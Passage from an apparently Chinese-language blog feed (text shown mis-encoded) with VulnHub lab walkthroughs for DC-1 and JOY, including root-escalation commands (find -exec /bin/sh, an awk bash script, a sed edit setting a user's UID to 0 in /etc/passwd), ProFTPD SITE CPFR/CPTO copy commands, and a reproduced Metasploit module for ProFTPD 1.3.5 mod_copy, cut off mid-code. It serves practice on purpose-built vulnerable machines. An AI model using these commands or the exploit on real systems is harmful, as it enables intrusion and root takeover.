<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215153053.png" alt=""></p>
<p>å†è¿”å›æ ‡å‡†shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215153130.png" alt=""></p>
<p><a href="http://xn--LinEnum-4t3kgdr76xkzh4h9481a4gub.sh">è·‘ä¸€ä¸‹ææƒè„šæœ¬LinEnum.sh</a>ï¼Œæ³¨æ„åˆ°findå‘½ä»¤æ˜¯ä»¥rootèº«ä»½æ‰§è¡Œçš„ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215153907.png" alt=""></p>
<p>åœ¨GTFObinsä¸ŠæŸ¥æ‰¾ä¸€ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215154524.png" alt=""></p>
<p>æ ¹æ®æç¤ºæ‰§è¡Œ<code>find . -exec /bin/sh -p \; -quit</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200215154832.png" alt=""></p>
<p>æˆåŠŸè·å–rootæƒé™ã€‚</p>
<h2 id="0x04-Reference">0x04 Reference</h2>
<p><a href="https://blog.csdn.net/weixin_44214107/article/details/102493939">https://blog.csdn.net/weixin_44214107/article/details/102493939</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub::DC-1-walkthrough</title>
    <url>/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough/</url>
    <content><![CDATA[<h1 id="VulnHub-DC-1-Walkthrough">VulnHub::DC-1 Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p>
<p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p>
<p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p>
<p>There are five flags in total, but the ultimate goal is to find and read the flag in rootâ€™s home directory. You donâ€™t even need to be root to do this, however, you will require root privileges.</p>
<p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p>
<p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>JohnTheRipper</li>
<li>Drupal Geddon 2 Forms API Property  Injection</li>
<li>Drupal Geddon SQL Injection (Add admin user)</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>æŸ¥æ‰¾é¶æœºIPï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218115253.png" alt=""></p>
<p>æŸ¥æ‰¾é¶æœºç«¯å£å’ŒæœåŠ¡ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218115157.png" alt=""></p>
<p>ä»drupal 7ä¸‹æ‰‹ï¼Œåœ¨metasploitä¸­æŸ¥çœ‹ç›¸å…³æ¼æ´ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218120059.png" alt=""></p>
<p>å‘ç°<code>drupal_drupalgeddon2</code>å¯ä»¥æˆåŠŸexploitï¼Œè¿›è¡Œç›¸å…³é…ç½®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218120416.png" alt=""></p>
<p>ä½¿ç”¨Pythonå‘½ä»¤è·å–æ­£å¸¸ttyï¼Œè·å¾—ç¬¬ä¸€ä¸ªflag1.txtï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218120549.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬å»æ‰¾é…ç½®æ–‡ä»¶ï¼ŒGoogleä¸€ä¸‹drupalç«™ç‚¹çš„é…ç½®æ–‡ä»¶ç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218121857.png" alt=""></p>
<p>ä¸ä»…å¾—åˆ°flag2çš„å†…å®¹ï¼Œè¿˜æœ‰MySQLæ•°æ®åº“çš„è¿æ¥ç”¨æˆ·å’Œå¯†ç ï¼Œå°è¯•ç™»å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218154149.png" alt=""></p>
<p>æŸ¥è¯¢ç”¨æˆ·è¡¨çš„è´¦å·å’Œå¯†ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218155218.png" alt=""></p>
<p>ç”¨JohnTheRipperçˆ†ç ´å¯†ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200218173459.png" alt=""></p>
<p>ä½¿ç”¨Fredè´¦å·ç™»å½•åå°ï¼Œæ²¡æœ‰flagæˆ–hintï¼Œå°è¯•è·å–åå°ç®¡ç†å‘˜æƒé™ï¼Œç”¨<code>searchexploit</code>æŸ¥æ‰¾ç›¸å…³åˆ©ç”¨ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219110620.png" alt=""></p>
<p>æ ¹æ®æç¤ºæ–°å¢ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219111305.png" alt=""></p>
<p>åœ¨æ•°æ®åº“ä¸­æŸ¥è¯¢å‘ç°æˆåŠŸæ’å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219111533.png" alt=""></p>
<p>ç™»å½•åå°ç³»ç»Ÿï¼Œåœ¨<code>contents</code>ä¸­è·å¾—flag3ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219111639.png" alt=""></p>
<p>çœ‹ä¸€ä¸‹flag3ï¼Œè¦æˆ‘ä»¬å»æŸ¥çœ‹shadowæ–‡ä»¶ï¼Œçœ‹åˆ°permçŒœæµ‹æ˜¯ä¸æ˜¯suidææƒï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219113204.png" alt=""></p>
<p>findå‘½ä»¤å¯ä»¥ç”¨æ¥ææƒï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219114728.png" alt=""></p>
<p>è¾“å…¥<code>find . -exec /bin/sh \; -quit</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219114859.png" alt=""></p>
<p>æœ‰ä¸€ä¸ªflag4çš„ç”¨æˆ·ï¼Œè¿›å…¥ä¸»ç›®å½•å‘ç°flag4.txtï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219115024.png" alt=""></p>
<p>è¿›å…¥rootä¸»ç›®å½•ï¼Œå‘ç°æœ€åä¸€ä¸ªflagï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219115302.png" alt=""></p>
<h2 id="0x04-Extra">0x04 Extra</h2>
<p>æ ¹æ®flag3çš„æç¤ºï¼ŒæœŸæœ›çš„åšæ³•åº”è¯¥æ˜¯ç”¨findå‘½ä»¤æŸ¥è¯¢ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219150714.png" alt=""></p>
<blockquote>
<p>å‘½ä»¤è§£é‡Šï¼š<a href="https://blog.csdn.net/u010900754/article/details/83020378?utm_source=distribute.pc_relevant.none-task">https://blog.csdn.net/u010900754/article/details/83020378?utm_source=distribute.pc_relevant.none-task</a></p>
</blockquote>
<p>æ‹¿åˆ°å¯†ç çš„sha256ï¼Œè¯•è¯•èƒ½ä¸èƒ½çˆ†ç ´å¯†ç å‡ºæ¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219170946.png" alt=""></p>
<p>sshç™»å½•æˆåŠŸï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200219171038.png" alt=""></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub::DigitalWorld.Local:JOY Walkthrough</title>
    <url>/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough/</url>
    <content><![CDATA[<h1 id="VulnHub-DigitalWorld-Local-JOY-Walkthrough">VulnHub::DigitalWorld.Local:JOY Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p>Does penetration testing spark joy? If it does, this machine is for you.</p>
<p>This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.</p>
<p>This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. ğŸ˜ƒ</p>
<p>If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Joy is (#1): <a href="https://www.youtube.com/watch?v=9AvWs2X-bEA">https://www.youtube.com/watch?v=9AvWs2X-bEA</a>, (#2): something that should be replicated, (#3): what happens when you clean out seemingly â€œhiddenâ€ closets.</p>
<p>Note: There are at least two reliable ways of obtaining user privileges and rooting this machine. Have fun. ğŸ˜ƒ</p>
<p>Feel free to contact the author at <a href="https://donavan.sg/blog">https://donavan.sg/blog</a> if you would like to drop a comment.</p>
<p>Download Linkï¼š<a href="https://www.vulnhub.com/entry/digitalworldlocal-joy,298/">https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</a></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<p><strong>Scanning</strong></p>
<ul>
<li>Nmap</li>
</ul>
<p><strong>Enumeration</strong></p>
<ul>
<li>FTP anonymous login</li>
</ul>
<p><strong>Exploit</strong></p>
<ul>
<li>Exploit proftpd using Metasploit</li>
</ul>
<p><strong>Privilege Escalation</strong></p>
<ul>
<li>Sudo right</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>æ‰«æç½‘æ®µï¼Œå‘ç°é¶æœºIPåœ°å€<code>192.168.0.108</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227133714.png" alt=""></p>
<p>æ‰«æé¶æœºç«¯å£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227143203.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227143240.png" alt=""></p>
<p>å‘ç°FTPæ˜¯å¯ä»¥åŒ¿åç™»å½•çš„ï¼Œç›´æ¥ä½¿ç”¨FileZillaå·¥å…·ç™»å½•ç«™ç‚¹æŸ¥çœ‹æ–‡ä»¶</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227160828.png" alt=""></p>
<p>ä¸€è·¯çœ‹ä¸‹æ¥å‘ç°directoryæ–‡ä»¶åˆ—å‡ºäº†<code>/home/patrick</code>ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå‰”é™¤ä¸€äº›å¸¸è§çš„å’Œéšæœºç”Ÿæˆçš„æ–‡ä»¶ä¹‹å¤–ï¼Œå°±å‰©ä¸‹<code>verison_control</code>å€¼å¾—çœ‹ä¸€çœ‹ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤æŠŠæ–‡ä»¶å¤åˆ¶åˆ°FTPç«™ç‚¹ç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161330.png" alt=""></p>
<blockquote>
<p>telnetå’Œftpå‘½ä»¤çš„åŒºåˆ«ï¼š</p>
<p>telnetè¿æ¥åï¼Œç”¨æˆ·ä¸»æœºå®é™…æˆä¸ºè¿œç¨‹TELNETæœåŠ¡å™¨çš„ä¸€ä¸ªè™šæ‹Ÿç»ˆç«¯ï¼ˆæˆ–ç§°æ˜¯å“‘ç»ˆç«¯ï¼‰ï¼Œä¸€åˆ‡æœåŠ¡å®Œå…¨åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä½†ç”¨æˆ·å†³ä¸èƒ½ä»è¿œç¨‹æœåŠ¡å™¨ä¸­ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼Œæˆ–æ‹·è´æ–‡ä»¶åˆ°ç”¨æˆ·ä¸»æœºä¸­æ¥ã€‚</p>
<p>ftpåˆ™ä¸åŒï¼Œå®ƒæ˜¯é‡‡ç”¨å®¢æˆ·æœº/æœåŠ¡å™¨æ¨¡å¼ï¼Œç”¨æˆ·èƒ½å¤Ÿæ“ä½œFTPæœåŠ¡å™¨ä¸­çš„ç›®å½•ï¼Œä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶ï¼Œä½†ç”¨æˆ·ä¸èƒ½è¯·æ±‚æœåŠ¡å™¨æ‰§è¡ŒæŸä¸ªæ–‡ä»¶ã€‚</p>
</blockquote>
<p><code>version_control</code>æ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Version Control of External-Facing Services:</span><br><span class="line"></span><br><span class="line">Apache: 2.4.25</span><br><span class="line">Dropbear SSH: 0.34</span><br><span class="line">ProFTPd: 1.3.5</span><br><span class="line">Samba: 4.5.12</span><br><span class="line"></span><br><span class="line">We should switch to OpenSSH and upgrade ProFTPd.</span><br><span class="line"></span><br><span class="line">Note that we have some other configurations in this machine.</span><br><span class="line">1. The webroot is no longer &#x2F;var&#x2F;www&#x2F;html. We have changed it to &#x2F;var&#x2F;www&#x2F;tryingharderisjoy.</span><br><span class="line">2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.</span><br></pre></td></tr></table></figure>
<p>æç¤ºæˆ‘ä»¬<code>ProFTP</code>éœ€è¦å‡çº§ï¼Œæˆ‘ä»¬å…ˆä»è¿™å…¥æ‰‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161634.png" alt=""></p>
<p>ç›´æ¥ä¸ŠMetasploitï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227161932.png" alt=""></p>
<p>è¿”å›ä¸€ä¸ªæ ‡å‡†Shellï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227162733.png" alt=""></p>
<p>æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æœ‰å“ªäº›æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165542.png" alt=""></p>
<p>æœ‰ä¸€ä¸ª<code>L37ISF8.php</code>æ–‡ä»¶æ˜¯åˆšåˆšexpç”Ÿæˆçš„ï¼Œæ¥ç€çœ‹ossecç›®å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165716.png" alt=""></p>
<p>æœ‰ä¸€ä¸ªæ¯”è¾ƒå¯ç–‘çš„æ–‡ä»¶<code>patricksecretsofjoy</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200227165805.png" alt=""></p>
<p>æœ‰patrickç”¨æˆ·çš„ç™»å½•å¯†ç ï¼Œrootçš„å¯†ç ç®—æ˜¯ä½œè€…çš„æ¶æå§ã€‚ç›´æ¥ç™»å½•patrickç”¨æˆ·ï¼Œå°è¯•ææƒï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228164812.png" alt=""></p>
<p>åˆ°è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯ç”¨æ¥ææƒï¼š</p>
<ol>
<li>
<p>åˆ©ç”¨<code>/home/patrick/script/test</code>çš„è„šæœ¬æ–‡ä»¶æ¥æ›´æ”¹<code>/etc/passwd</code>çš„æƒé™ï¼Œè¿›è€Œä¿®æ”¹patrickç”¨æˆ·çš„æƒé™ï¼›</p>
</li>
<li>
<p>ä¸Šä¼ è‡ªå·±ç¼–å†™çš„è„šæœ¬è‡³ç›¸åŒçš„ç›®å½•ã€‚è¿™é‡Œå°±æ–‡å­—å™è¿°ä¸€ä¸‹å…·ä½“è¿‡ç¨‹ï¼š</p>
<p>a) é¦–å…ˆåœ¨æœ¬æœºä¸Šç¼–å†™Shellè„šæœ¬<code>echo &quot;awk 'BEGIN &#123;system(\&quot;/bin/bash\&quot;)&#125;'&quot; &gt; test</code>ï¼›</p>
<p>b) å†ä½¿ç”¨ftpä¸Šä¼ åˆ°<code>upload</code>ç›®å½•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.0.108</span><br><span class="line">cd upload</span><br><span class="line">put test</span><br></pre></td></tr></table></figure>
<p>c) å†ä½¿ç”¨telnetä¼ å…¥åˆ°<code>/home/patrick/script</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.0.108 21</span><br><span class="line">site cpfr &#x2F;home&#x2F;ftp&#x2F;upload&#x2F;test</span><br><span class="line">site cpto &#x2F;home&#x2F;patrick&#x2F;script&#x2F;test</span><br></pre></td></tr></table></figure>
<p>d) å†æ‰§è¡Œ<code>test</code>æ–‡ä»¶<code>sudo /home/patrick/script/test</code></p>
</li>
</ol>
<p>ç›¸å¯¹è€Œè¨€ç¬¬ä¸€ä¸ªæ€è·¯ä¼šæ¯”è¾ƒç®€å•ï¼Œä¿®æ”¹æƒé™ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228192822.png" alt=""></p>
<p>ä¿®æ”¹Patrickç”¨æˆ·çš„uidå’Œgidï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228213715.png" alt=""></p>
<blockquote>
<p>è¿™é‡Œå¯ä»¥ç›´æ¥ç™»å½•é¶æœºç”¨nanoä¿®æ”¹ï¼Œä½†æ˜¯å¦‚ä½•åœ¨ä¸»æœºä¸Šçš„åå¼¹shellä¿®æ”¹å‘¢ï¼Ÿå› ä¸ºåå¼¹shellä¸æ”¯æŒvim, vi, nanoç­‰äº¤äº’å¼çª—å£ï¼Œä½†æ˜¯åˆ«å¿˜äº†è¿˜æœ‰ä¸€ä¸ª<code>sed</code>å‘½ä»¤å¯ä»¥ç”¨æ¥ç¼–è¾‘æ–‡ä»¶ï¼Œ<code>sed '36,36s/1000:1000/0:0/g' /etc/passwd</code>ï¼Œä¸Šé¢è¿™ä¸ªå‘½ä»¤è¡¨ç¤ºä¿®æ”¹<code>/etc/passwd</code>æ–‡ä»¶ä¸­çš„ç¬¬36è¡Œï¼ŒæŠŠ<code>1000:1000</code>æ›¿æ¢æˆ<code>0:0</code></p>
</blockquote>
<p>é‡æ–°ç™»å½•ä¸€ä¸‹å°±å¯ä»¥è·å¾—rootæƒé™äº†ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214224.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214233.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200228214248.png" alt=""></p>
<h2 id="0x04-ProFTP-1-3-5-exp">0x04 ProFTP 1.3.5 exp</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: http://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"></span><br><span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span><br><span class="line"></span><br><span class="line">  Rank = ExcellentRanking</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::Tcp</span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::HttpClient</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;ProFTPD 1.3.5 Mod_Copy Command Execution&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; %q&#123;</span><br><span class="line">          This module exploits the SITE CPFR/CPTO commands in ProFTPD version <span class="number">1.3</span><span class="number">.5</span>.</span><br><span class="line">          Any unauthenticated client can leverage these commands to copy files <span class="keyword">from</span> any</span><br><span class="line">          part of the filesystem to a chosen destination. The copy commands are executed with</span><br><span class="line">          the rights of the ProFTPD service, which by <span class="keyword">default</span> runs under the privileges of the</span><br><span class="line">          <span class="string">&#x27;nobody&#x27;</span> user. By using /proc/<span class="built_in">self</span>/cmdline to copy a PHP payload to the website</span><br><span class="line">          <span class="built_in">directory</span>, PHP remote code execution is made possible.</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">&#x27;Vadim Melihow&#x27;</span>, <span class="comment"># Original discovery, Proof of Concept</span></span><br><span class="line">          <span class="string">&#x27;xistence &lt;xistence[at]0x90.nl&gt;&#x27;</span> <span class="comment"># Metasploit module</span></span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span>        =&gt; MSF_LICENSE,</span><br><span class="line">      <span class="string">&#x27;References&#x27;</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;CVE&#x27;</span>, <span class="string">&#x27;2015-3306&#x27;</span> ],</span><br><span class="line">          [ <span class="string">&#x27;EDB&#x27;</span>, <span class="string">&#x27;36742&#x27;</span> ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span>     =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; [ <span class="string">&#x27;unix&#x27;</span> ],</span><br><span class="line">      <span class="string">&#x27;Arch&#x27;</span>           =&gt; ARCH_CMD,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span>        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;Compat&#x27;</span>      =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&#x27;PayloadType&#x27;</span> =&gt; <span class="string">&#x27;cmd&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;RequiredCmd&#x27;</span> =&gt; <span class="string">&#x27;generic gawk bash python perl&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span>        =&gt;</span><br><span class="line">        [</span><br><span class="line">          [ <span class="string">&#x27;ProFTPD 1.3.5&#x27;</span>, &#123; &#125; ]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;Apr 22 2015&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    register_options(</span><br><span class="line">      [</span><br><span class="line">        OptPort.<span class="keyword">new</span>(<span class="string">&#x27;RPORT&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;HTTP port&#x27;</span>, <span class="number">80</span>]),</span><br><span class="line">        OptPort.<span class="keyword">new</span>(<span class="string">&#x27;RPORT_FTP&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;FTP port&#x27;</span>, <span class="number">21</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;TARGETURI&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Base path to the website&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;TMPPATH&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Absolute writable path&#x27;</span>, <span class="string">&#x27;/tmp&#x27;</span>]),</span><br><span class="line">        OptString.<span class="keyword">new</span>(<span class="string">&#x27;SITEPATH&#x27;</span>, [<span class="literal">true</span>, <span class="string">&#x27;Absolute writable website path&#x27;</span>, <span class="string">&#x27;/var/www&#x27;</span>])</span><br><span class="line">      ], <span class="built_in">self</span>.<span class="keyword">class</span>)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def check</span><br><span class="line">    ftp_port = datastore[<span class="string">&#x27;RPORT_FTP&#x27;</span>]</span><br><span class="line">    sock = Rex::Socket.create_tcp(<span class="string">&#x27;PeerHost&#x27;</span> =&gt; rhost, <span class="string">&#x27;PeerPort&#x27;</span> =&gt; ftp_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sock.nil?</span><br><span class="line">      fail_with(Failure::Unreachable, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;220&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    sock.puts(<span class="string">&quot;SITE CPFR /etc/passwd\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      Exploit::CheckCode::Vulnerable</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Exploit::CheckCode::Safe</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def exploit</span><br><span class="line">    ftp_port = datastore[<span class="string">&#x27;RPORT_FTP&#x27;</span>]</span><br><span class="line">    get_arg = rand_text_alphanumeric(<span class="number">5</span>+rand(<span class="number">3</span>))</span><br><span class="line">    payload_name = rand_text_alphanumeric(<span class="number">5</span>+rand(<span class="number">3</span>)) + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = Rex::Socket.create_tcp(<span class="string">&#x27;PeerHost&#x27;</span> =&gt; rhost, <span class="string">&#x27;PeerPort&#x27;</span> =&gt; ftp_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sock.nil?</span><br><span class="line">      fail_with(Failure::Unreachable, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failed to connect to FTP server&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Connected to FTP server&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;220&#x27;</span>)</span><br><span class="line">      fail_with(Failure::Unknown, <span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Failure retrieving ProFTPD 220 OK banner&quot;</span>)</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">&quot;#&#123;rhost&#125;:#&#123;ftp_port&#125; - Sending copy commands to FTP server&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sock.puts(<span class="string">&quot;SITE CPFR /proc/self/cmdline\r\n&quot;</span>)</span><br><span class="line">    res = sock.get_once(<span class="number">-1</span>, <span class="number">10</span>)</span><br><span class="line">    unless res &amp;&amp; res.<span class="keyword">include</span>?(<span class="string">&#x27;350&#x27;</span>)</span><br><span class="line">      